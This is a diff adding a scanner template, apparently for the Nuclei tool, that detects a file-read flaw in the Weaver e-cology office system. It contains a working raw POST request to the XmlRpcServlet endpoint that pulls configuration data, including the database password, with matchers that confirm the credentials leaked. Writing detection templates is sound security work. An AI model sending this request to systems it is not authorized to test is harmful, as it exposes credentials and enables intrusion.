@@ -1,0 +1,46 @@
+id: weaver-ecology-xmlrpc-file-read
+info:
+  name: Weaver Ecology XmlRpcServlet Path File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver e-cology is an OA office system specifically designed for large and medium-sized enterprises, supporting simultaneous work on PC, mobile, and WeChat platforms. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.
+  reference:
+    - https://www.weaver.com.cn/cs/securityDownload.html
+  tags:
+    - file-read
+    - oa
+    - weaver
+http:
+  - raw:
+      - |
+        POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Content-Type: application/xml
+        Accept-Language: zh-CN,zh;q=0.8
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
+        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <methodCall>
+        <methodName>WorkflowService.LoadTemplateProp</methodName>
+        <params>
+        <param>
+        <value><string>weaver</string></value>
+        </param>
+        </params>
+        </methodCall>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<methodResponse>"
+          - "<params>"
+          - "ecology.password"
+          - "ecology.url"
+        part: body
